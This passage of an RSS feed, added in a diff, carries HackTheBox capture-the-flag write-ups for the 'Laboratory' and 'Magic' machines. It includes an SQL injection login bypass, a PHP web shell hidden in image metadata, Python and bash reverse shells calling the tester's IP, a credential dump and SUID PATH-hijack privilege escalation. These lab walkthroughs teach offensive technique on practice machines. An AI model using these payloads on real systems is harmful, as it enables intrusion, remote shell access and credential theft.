+Changes to be committed:
+  <span style="color:#f92672">(</span>use <span style="color:#e6db74">&#34;git restore --staged &lt;file&gt;...&#34;</span> to unstage<span style="color:#f92672">)</span>
+        deleted:    README.md
+        deleted:    create_gitlab.sh
+        deleted:    dexter/.ssh/authorized_keys
+        deleted:    dexter/.ssh/id_rsa
+        deleted:    dexter/recipe.url
+        deleted:    dexter/todo.txt
+</code></pre></div><p>Interestingly, this repository contains a set of SSH keys.</p>
+<h4 id="ssh---dexter">SSH - dexter</h4>
+<p>I can restore the deleted files with <code>git checkout --</code> command.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
+$ git checkout --
+→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
+$ ls -la
+total <span style="color:#ae81ff">20</span>
+drwxr-xr-x <span style="color:#ae81ff">3</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">22</span> 09:36 .
+drwxr-xr-x <span style="color:#ae81ff">4</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">22</span> 09:36 ..
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">102</span> Mar <span style="color:#ae81ff">22</span> 09:36 recipe.url
+drwxr-xr-x <span style="color:#ae81ff">2</span> root root <span style="color:#ae81ff">4096</span> Mar <span style="color:#ae81ff">22</span> 09:36 .ssh
+-rw-r--r-- <span style="color:#ae81ff">1</span> root root  <span style="color:#ae81ff">160</span> Mar <span style="color:#ae81ff">22</span> 09:36 todo.txt
+</code></pre></div><p>I can now login as <code>dexter</code> using the SSH key I obtained.</p>
+<p>At first try, it says the key is invalid format.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
+$ chmod <span style="color:#ae81ff">600</span> dexter/.ssh/id_rsa
+→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
+$ ssh -i dexter/.ssh/id_rsa dexter@10.10.10.216
+Load key <span style="color:#e6db74">&#34;id_rsa&#34;</span>: invalid format
+dexter@10.10.10.216: Permission denied <span style="color:#f92672">(</span>publickey<span style="color:#f92672">)</span>.
+</code></pre></div><p>I fixed that by adding an empty string using the <code>echo</code> command.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
+$ echo <span style="color:#e6db74">&#39;&#39;</span> &gt;&gt; dexter/.ssh/id_rsa
+</code></pre></div><p>Now it logs me in.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
+$ ssh -i id_rsa dexter@10.10.10.216
+dexter@laboratory:~$
+dexter@laboratory:~$ id;hostname
+uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dexter<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dexter<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>dexter<span style="color:#f92672">)</span>
+laboratory
+dexter@laboratory:~$ ls -l
+total <span style="color:#ae81ff">4</span>
+-r--r----- <span style="color:#ae81ff">1</span> root dexter <span style="color:#ae81ff">33</span> Mar <span style="color:#ae81ff">22</span> 10:06 user.txt
+</code></pre></div><h3 id="shell-as-root">Shell as root</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>The contents of <code>todo.txt</code> talks something about “docker security”, but I have no idea what it is except it uses three hashtags.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «secure-docker.git» «10.10.14.39» git:<span style="color:#f92672">(</span>master<span style="color:#f92672">)</span> ✗
+$ cat dexter/todo.txt
+<span style="color:#75715e"># DONE: Secure docker for regular users</span>
+<span style="color:#75715e">### DONE: Automate docker security on startup</span>
+<span style="color:#75715e"># TODO: Look into &#34;docker compose&#34;</span>
+<span style="color:#75715e"># TODO: Permanently ban DeeDee from lab#</span>
+</code></pre></div><p>It turns out it’s a binary name which has a SUID bit set found by Linpeas.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">...&lt;SNIP&gt;...
+════════════════════════════════════╣ Interesting Files ╠════════════════════════════════════
+
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> SUID - Check easy privesc, exploits and write perms                                                                                
+-rwsr-xr-x <span style="color:#ae81ff">1</span> root   dexter           17K Aug <span style="color:#ae81ff">28</span>  <span style="color:#ae81ff">2020</span> /usr/local/bin/docker-security
+</code></pre></div><p>Inspecting the binary with the <code>ltrace</code> command finds out that it uses relative path to call <code>chmod</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dexter@laboratory:~$ ltrace docker-security 
+
+setuid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>                                                                                                <span style="color:#f92672">=</span> -1
+setgid<span style="color:#f92672">(</span>0<span style="color:#f92672">)</span>                                                                                                <span style="color:#f92672">=</span> -1
+system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;chmod 700 /usr/bin/docker&#34;</span>chmod: changing permissions of <span style="color:#e6db74">&#39;/usr/bin/docker&#39;</span>: Operation not permitted
+ &lt;no <span style="color:#66d9ef">return</span> ...&gt;
+--- SIGCHLD <span style="color:#f92672">(</span>Child exited<span style="color:#f92672">)</span> ---
+&lt;... system resumed&gt; <span style="color:#f92672">)</span>                                                                                   <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span>
+system<span style="color:#f92672">(</span><span style="color:#e6db74">&#34;chmod 660 /var/run/docker.sock&#34;</span>chmod: changing permissions of <span style="color:#e6db74">&#39;/var/run/docker.sock&#39;</span>: Operation not permitted
+ &lt;no <span style="color:#66d9ef">return</span> ...&gt;
+--- SIGCHLD <span style="color:#f92672">(</span>Child exited<span style="color:#f92672">)</span> ---
+&lt;... system resumed&gt; <span style="color:#f92672">)</span>                                                                                   <span style="color:#f92672">=</span> <span style="color:#ae81ff">256</span>
++++ exited <span style="color:#f92672">(</span>status 0<span style="color:#f92672">)</span> +++
+</code></pre></div><p>Knowing this, I could hijack the execution path.</p>
+<h4 id="suid---path-hijack">SUID - Path Hijack</h4>
+<p>First, I&rsquo;ll create a fake <code>chmod</code> that calls <code>bash</code> binary at <code>/dev/shm</code>, I&rsquo;ll also add an execute permission on that file.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dexter@laboratory:~$ cd /dev/shm
+dexter@laboratory:/dev/shm$ echo -e <span style="color:#e6db74">&#39;#!/bin/bash\n/bin/bash&#39;</span> &gt; chmod
+dexter@laboratory:/dev/shm$
+dexter@laboratory:/dev/shm$ /bin/chmod +x chmod
+</code></pre></div><p>Next, I&rsquo;ll add current directory (<code>/dev/shm</code>) to <code>$PATH</code> variable. Now if I call <code>chmod</code>, it will point to my <code>chmod</code> on <code>/dev/shm</code></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">dexter@laboratory:/dev/shm$ export PATH<span style="color:#f92672">=</span><span style="color:#66d9ef">$(</span>pwd<span style="color:#66d9ef">)</span>:$PATH
+dexter@laboratory:/dev/shm$
+dexter@laboratory:/dev/shm$ which chmod
+/dev/shm/chmod
+</code></pre></div><p>From there, I can just execute <code>docker-security</code> to obtain a root access as well as the root flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">dexter@laboratory:/dev/shm$ docker-security 
+root@laboratory:/dev/shm#
+root@laboratory:/dev/shm# cut -c6- /root/root.txt 
+9f593f335a0a1f403c753719eb6
+</code></pre></div><hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://hackerone.com/reports/827052">https://hackerone.com/reports/827052</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+    <item>
+      <title>HackTheBox - Magic</title>
+      <link>https://fahmifj.github.io/writeups/hackthebox/htb-magic/</link>
+      <pubDate>Fri, 09 Apr 2021 13:32:05 +0700</pubDate>
+      
+      <guid>https://fahmifj.github.io/writeups/hackthebox/htb-magic/</guid>
+      <description>Magic is a medium difficulty Linux machine from HackTheBox that features a php-based web application which is vulnerable to SQL injection for login bypass. The application upload feature has an upload filter that can be bypassed by embedding a web shell payload to a valid image file and adding a php extension to it. With that web shell, I&amp;rsquo;m able to gain a foothold on the system and use database credentials to dump admin password that is reused by a user on the box.</description>
+      <content:encoded><![CDATA[<p>Magic is a medium difficulty Linux machine from HackTheBox that features a php-based web application which is vulnerable to SQL injection for login bypass. The application upload feature has an upload filter that can be bypassed by embedding a web shell payload to a valid image file and adding a php extension to it. With that web shell, I&rsquo;m able to gain a foothold on the system and use database credentials to dump admin password that is reused by a user on the box. For the root part, there&rsquo;s a SUID binary that calls other binaries without their absolute path. This allows me to perform a path hijack attack and gain root access.</p>
+<h3 id="skills-learned">Skills Learned</h3>
+<ul>
+<li>SQL injection</li>
+<li>Bypassing Upload Filter</li>
+<li>SUID exploitation</li>
+</ul>
+<h3 id="tools">Tools</h3>
+<ul>
+<li>Kali Linux (Attacking Machine) - <a href="https://www.kali.org/">https://www.kali.org/</a></li>
+<li>Nmap - Preinstalled in Kali Linux</li>
+<li>Exiftool - <a href="https://exiftool.org/">https://exiftool.org/</a></li>
+</ul>
+<h2 id="reconnaissance">Reconnaissance</h2>
+<h3 id="nmap">Nmap</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «magic» «10.10.14.169»
+$ nmap -sC -sV -oA scans/magic 10.10.10.185
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span style="color:#f92672">(</span>Ubuntu Linux; protocol 2.0<span style="color:#f92672">)</span>
+| ssh-hostkey:
+|   <span style="color:#ae81ff">2048</span> 06:d4:89:bf:51:f7:fc:0c:f9:08:5e:97:63:64:8d:ca <span style="color:#f92672">(</span>RSA<span style="color:#f92672">)</span>
+|   <span style="color:#ae81ff">256</span> 11:a6:92:98:ce:35:40:c7:29:09:4f:6c:2d:74:aa:66 <span style="color:#f92672">(</span>ECDSA<span style="color:#f92672">)</span>
+|_  <span style="color:#ae81ff">256</span> 71:05:99:1f:a8:1b:14:d6:03:85:53:f8:78:8e:cb:88 <span style="color:#f92672">(</span>ED25519<span style="color:#f92672">)</span>
+80/tcp open  http    Apache httpd 2.4.29 <span style="color:#f92672">((</span>Ubuntu<span style="color:#f92672">))</span>
+|_http-server-header: Apache/2.4.29 <span style="color:#f92672">(</span>Ubuntu<span style="color:#f92672">)</span>
+|_http-title: Magic Portfolio
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre></div><p><code>nmap</code> found two ports open, an HTTP service on port 80 and SSH service on port 22</p>
+<h2 id="enumeration">Enumeration</h2>
+<h3 id="tcp-80---website">TCP 80  -  Website</h3>
+<p>The home page shows a bunch of images.</p>
+<p><img src="imgs/image-20210413132328926.png" alt="image-20210413132328926" style="zoom:80%;" /></p>
+<p>By clicking &ldquo;Views image&rdquo;, I know some images located on <code>/images/uploads</code> and some others on <code>/images/fulls</code>. At the bottom page, there&rsquo;s a login button that points to <code>/login.php</code></p>
+<p><img src="imgs/image-20210412052815532.png" alt="image-20210412052815532" style="zoom: 80%;" /></p>
+<p>Common credentials don&rsquo;t seem to work here.</p>
+<h4 id="sql-injection---login-bypass-on-loginphp">SQL injection - Login bypass on <code>/login.php</code></h4>
+<blockquote>
+<p>The login form doesn&rsquo;t allows spacing between character, but it can be tricked by copy and paste.</p>
+</blockquote>
+<p>A basic sql injection technique <code>' or 1 = 1 -- - </code>  to bypass login is work against the login page.</p>
+<blockquote>
+<p>In MySQL, a space after a comment is a must <code>-- [space]</code>, because of that I added <code>-- -</code> to make it clear.</p>
+</blockquote>
+<p>We can assume the back-end query would look like this:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql">...<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">some</span> php<span style="color:#f92672">&gt;</span>...
+<span style="color:#960050;background-color:#1e0010">$</span>username <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>_POST[<span style="color:#e6db74">&#39;user&#39;</span>]
+<span style="color:#960050;background-color:#1e0010">$</span>pwd <span style="color:#f92672">=</span> <span style="color:#960050;background-color:#1e0010">$</span>_POST[<span style="color:#e6db74">&#39;password&#39;</span>]
+...<span style="color:#f92672">&lt;</span><span style="color:#66d9ef">some</span> php<span style="color:#f92672">&gt;</span>...
+
+<span style="color:#66d9ef">SELECT</span> username, password <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">table</span>.<span style="color:#66d9ef">user</span> <span style="color:#66d9ef">where</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$username&#39;</span> <span style="color:#66d9ef">and</span> password<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;$pwd&#39;</span>
+</code></pre></div><p>If I assign <code>' or 1 = 1 -- - </code> as value of <code>$username</code>, it becomes:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sql" data-lang="sql"><span style="color:#66d9ef">SELECT</span> username, password <span style="color:#66d9ef">from</span> <span style="color:#66d9ef">table</span>.<span style="color:#66d9ef">user</span> <span style="color:#66d9ef">where</span> username<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span> <span style="color:#66d9ef">or</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#75715e">-- -&#39; and password=&#39;$pwd&#39;
+</span></code></pre></div><h2 id="foothold">Foothold</h2>
+<h3 id="shell-as-www-data">Shell as www-data</h3>
+<h4 id="upload-filter-bypass">Upload filter bypass</h4>
+<p>Upon a successful login, the site redirects me to <code>/upload.php</code>. It shows up with an upload form. It only accepts a valid image file.</p>
+<p><img src="imgs/image-20210413153556151.png" alt="image-20210413153556151" style="zoom:80%;" /></p>
+<p>After some testing, I can bypass this upload filter by embedding my php shell on an image file (I took it from the web itself). This can be done by using <code>exiftools</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «forest» «10.10.14.169»
+$ ./exiftool -Comment<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&lt;?php echo &#34;&lt;pre&gt;&#34;; system($_GET[&#34;cmd&#34;]); ?&gt;&#39;</span> iamf.jpg
+</code></pre></div><p>Next, I added <code>.php</code> extension right before the image extension (in my case it is <code>.jpg</code>, so it becomes <code>filename.php.jpg</code>).</p>
+<p>Back to <code>/upload.php</code>, now it accepts my php embedded image.</p>
+<p><img src="imgs/image-20210413153504323.png" alt="image-20210413153504323" style="zoom:80%;" /></p>
+<p>I can find the uploaded file at <code>http://htb.magic/images/uploads/</code>.</p>
+<p>When I visit <code>http://htb.magic/images/uploads/iamf.php.jpg?cmd=pwd</code>, I can see the code execution is working</p>
+<p><img src="https://cdn-images-1.medium.com/max/1000/1*WJEvgyrM5UmXULt8uBhu3A.png" alt="img" style="zoom:80%;" /></p>
+<h4 id="shell-access">Shell access</h4>
+<p>The machine has Python3 installed. With that, I can send a Python one liner reverse shell and set up a listener on port 443 to gain a foothold on the system.</p>
+<p>I&rsquo;ll enter this URL on the browser.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-http" data-lang="http"><span style="color:#960050;background-color:#1e0010">http://htb.magic/images/uploads/iamf.php.jpg?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.169%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);%20os.dup2(s.fileno(),2);p=subprocess.call([%22/bin/bash%22,%22-i%22]);%27&#34;
+</span></code></pre></div><p>Now on my listener, it caught the shell</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «magic» «10.10.14.169»
+$ nc -nvlp <span style="color:#ae81ff">443</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">443</span> ...
+connect to <span style="color:#f92672">[</span>10.10.14.169<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.10.185<span style="color:#f92672">]</span> <span style="color:#ae81ff">19448</span>
+bash: cannot set terminal process group <span style="color:#f92672">(</span>1327<span style="color:#f92672">)</span>: Inappropriate ioctl <span style="color:#66d9ef">for</span> device
+bash: no job control in this shell
+$ id
+uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+</code></pre></div><h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="shell-as-theseus">Shell as theseus</h3>
+<h4 id="enumeration-1">Enumeration</h4>
+<p>I discovered a database configuration <code>db.php5</code> that stores credentials after enumerating the current working directory with the find command.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ find . -type f -user www-data
+
+...&lt;SNIP&gt;...
+./var/www/Magic/db.php5
+...&lt;SNIP&gt;...
+</code></pre></div><p><img src="imgs/image-20210413153535228.png" alt="image-20210413153535228" style="zoom:80%;" /></p>
+<h4 id="database-dump">Database dump</h4>
+<p>I can use <code>netstat</code> to confirm that the MySQL server is currently running.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@ubuntu:/var/www/Magic$ netstat -tlpn
+
+...&lt;SNIP&gt;...
+Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
+...&lt;SNIP&gt;...
+tcp		0		<span style="color:#ae81ff">0</span>   127.0.0.1:3306           0.0.0.0:*              LISTEN       -
+...&lt;SNIP&gt;...
+</code></pre></div><p>Unfortunately, <code>mysql</code> binary is not present in the box.</p>
+<p><img src="imgs/image-20210413153425371.png" alt="image-20210413153425371" style="zoom:67%;" /></p>
+<p>Instead, I could use <code>mysqldump</code> to dump the database.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@ubuntu:/var/www/Magic$ mysqldump Magic -u theseus -p<span style="color:#e6db74">&#39;iamkingtheseus&#39;</span>
+
+...&lt;SNIP&gt;...
+LOCK TABLES <span style="color:#e6db74">`</span>login<span style="color:#e6db74">`</span> WRITE;
+/*!40000 ALTER TABLE <span style="color:#e6db74">`</span>login<span style="color:#e6db74">`</span> DISABLE KEYS */;
+INSERT INTO <span style="color:#e6db74">`</span>login<span style="color:#e6db74">`</span> VALUES <span style="color:#f92672">(</span>1,<span style="color:#e6db74">&#39;admin&#39;</span>,<span style="color:#e6db74">&#39;Th3s3usW4sK1ng&#39;</span><span style="color:#f92672">)</span>;
+/*!40000 ALTER TABLE <span style="color:#e6db74">`</span>login<span style="color:#e6db74">`</span> ENABLE KEYS */;
+UNLOCK TABLES;                                           
+/*!40103 SET TIME_ZONE<span style="color:#f92672">=</span>@OLD_TIME_ZONE */;
+...&lt;SNIP&gt;...
+</code></pre></div><h4 id="shell-upgrade-to-ssh">Shell upgrade to SSH</h4>
+<p>The password is reused by user <code>theseus</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">www-data@ubuntu:/var/www/Magic$ su theseus
+Password: 
+theseus@ubuntu:/var/www/Magic$
+</code></pre></div><p>Before enumeration, I would like to switch to SSH. First, I&rsquo;ll generate a new ssh key.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «magic» «10.10.14.169»
+$ ssh-keygen -f theseus 
+</code></pre></div><p>Then, I&rsquo;ll add the newly generated public key to <code>theseus</code>&rsquo;s <code>authorized_keys</code>.</p>
+<pre><code>theseus@ubuntu:~/.ssh$ echo 'ssh-rsa AAABBBCCCDDD' &gt;&gt; authorized_keys
+</code></pre><p>Now I can log in via SSH.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">→ root@iamf «magic» «10.10.14.169»
+$ ssh -i  theseus@10.10.10.185
+...&lt;SNIP&gt;...
+theseus@ubuntu:~$ id
+uid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>theseus<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>1000<span style="color:#f92672">(</span>theseus<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>100<span style="color:#f92672">(</span>users<span style="color:#f92672">)</span>,1000<span style="color:#f92672">(</span>theseus<span style="color:#f92672">)</span>
+</code></pre></div><h2 id="shell-as-root">Shell as root</h2>
+<h4 id="enumeration-2">Enumeration</h4>
+<p>Upon enumerating for SUID, there&rsquo;s a binary that doesn&rsquo;t seem a common SUID on Ubuntu.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:~$ find / -perm -u<span style="color:#f92672">=</span>s -type f 2&gt;/dev/null
+</code></pre></div><p><img src="imgs/image-20210413153352652.png" alt="image-20210413153352652" style="zoom: 67%;" /></p>
+<p>The <code>sysinfo</code> binary is owned by root, but it can be executed by the <code>users</code> group and  <code>theseus</code> is a member of that group.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:~$ ls -las /bin | grep sysinfo
+ <span style="color:#ae81ff">24</span> -rwsr-x--- <span style="color:#ae81ff">1</span> root users <span style="color:#ae81ff">22040</span> Oct <span style="color:#ae81ff">21</span> <span style="color:#ae81ff">2019</span> sysinfo
+</code></pre></div><p>I executed the binary and it returns some hardware information on screen that looks similar to <code>lshw</code>, <code>free</code> and other binary related to hardware info. A quick search on Google shows this:</p>
+<p><img src="imgs/image-20210413153328164.png" alt="image-20210413153328164" style="zoom:80%;" /></p>
+<p>It is the same header.</p>
+<p><img src="imgs/image-20210413153311827.png" alt="image-20210413153311827" style="zoom:80%;" /></p>
+<p>Running <code>strings</code> against <code>sysinfo</code> reveals it calls <code>lshw</code>, <code>free</code>, <code>fdisk</code> and some other bins without their absolute path. (I don&rsquo;t have the screenshots to show what it looks like, also can&rsquo;t find the logs on my notes, sorry)</p>
+<ul>
+<li>Absolute path: <code>/bin/sysinfo</code> &ndash;&gt; fixed path, can not be modified except global write access is permitted. (cmiiw)</li>
+<li>Relative path: <code>sysinfo</code> &ndash;&gt; resolved by user&rsquo;s env, can be modified</li>
+</ul>
+<h4 id="path-hijacking-on-suid">Path Hijacking on SUID</h4>
+<p>Knowing the SUID binary uses relative path to call other binaries, I could abuse this by creating, for example, a fake <code>lshw</code> binary that contains a reverse shell.</p>
+<p>First, I’ll create a fake <code>lshw</code> in <code>/tmp/iamf</code> folder and add append one liner bash reverse shell.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:/tmp$ mkdir iamf
+theseus@ubuntu:/tmp$
+theseus@ubuntu:/tmp$ which lshw
+/bin/lshw
+</code></pre></div><p>Next, I’ll export <code>/tmp/iamf</code> to environment variable <code>$PATH</code>. Now If I call <code>lshw</code>, the OS will resolve it to the one on <code>/tmp/iamf</code>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:/tmp$ echo -e <span style="color:#e6db74">&#39;#!/bin/sh bash -i &gt;&amp; /dev/tcp/10.10.10.169/1234 0&gt;&amp;1&#39;</span> &gt; iamf/lshw
+theseus@ubuntu:/tmp$
+theseus@ubuntu:/tmp$ export PATH<span style="color:#f92672">=</span>/tmp/iamf:$PATH
+theseus@ubuntu:/tmp$
+theseus@ubuntu:/tmp$ which lshw
+/tmp/iamf/lshw
+</code></pre></div><p>After that, I can just execute the <code>sysinfo</code> binary.</p>
+<p>However, it then just hangs.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">theseus@ubuntu:/tmp$ sysinfo
+<span style="color:#f92672">====================</span>Hardware Info<span style="color:#f92672">====================</span>
+</code></pre></div><p>That is because it was pwned on my listener.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-text" data-lang="text">→ root@iamf «magic» «10.10.14.169»
+$ nc -nvlp 1234
+listening on [any] 1234 ...
+connect to [10.10.14.169] from (UNKNOWN) [10.10.10.185] 36094
+root@ubuntu:/tmp/iamf# id
+uid=0(root) gid=0(root) groups=0(root),100(users),1000(theseus)
+</code></pre></div><center>
+<p><div class="img-container"><img src="imgs/image-20210413152136238.png" alt="image-20210413152136238"  /></div>
+</p>
+</center>
+<hr>
+<h2 id="references">References</h2>
+<ul>
+<li><a href="https://portswigger.net/support/using-sql-injection-to-bypass-authentication">https://portswigger.net/support/using-sql-injection-to-bypass-authentication</a></li>
+<li><a href="https://exiftool.org/">https://exiftool.org/</a></li>
+<li><a href="https://github.com/xapax/security/blob/master/bypass_image_upload.md">https://github.com/xapax/security/blob/master/bypass_image_upload.md</a></li>
+<li><a href="https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/">https://www.hackingarticles.in/linux-privilege-escalation-using-path-variable/</a></li>
+</ul>
+]]></content:encoded>
+    </item>
+    
+  </channel>
+</rss>
